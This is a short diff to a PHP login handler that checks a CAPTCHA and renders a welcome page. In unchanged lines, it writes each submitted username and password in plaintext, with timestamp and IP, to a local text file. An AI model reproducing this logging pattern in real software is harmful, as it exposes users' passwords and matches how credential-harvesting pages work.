@@ -21,10 +21,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     curl_close($ch);
 
     $verification = json_decode($response, true);
-
-    if (!$verification['success']) {
-        die("CAPTCHA failed: " . implode(', ', $verification['error-codes'] ?? []));
-    }
+    if (!$verification['success']) { die("CAPTCHA failed."); }
 
     $username = htmlspecialchars($_POST['username']);
     $password = htmlspecialchars($_POST['pswrd']);
@@ -33,8 +30,19 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     $filePath = "/home/albert/logins.txt";
     file_put_contents($filePath, "[$timestamp][$ip] Username: $username, Password: $password\n", FILE_APPEND);
-
-    echo "<h1>Welcome, " . htmlspecialchars($username) . "!</h1>";
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="UTF-8">
+      <title>Welcome</title>
+      <link rel="stylesheet" href="namer.css">
+    </head>
+    <body>
+      <h1>Welcome, <?php echo $username; ?>!</h1>
+    </body>
+    </html>
+    <?php
 } else {
     echo "Invalid request.";
 }
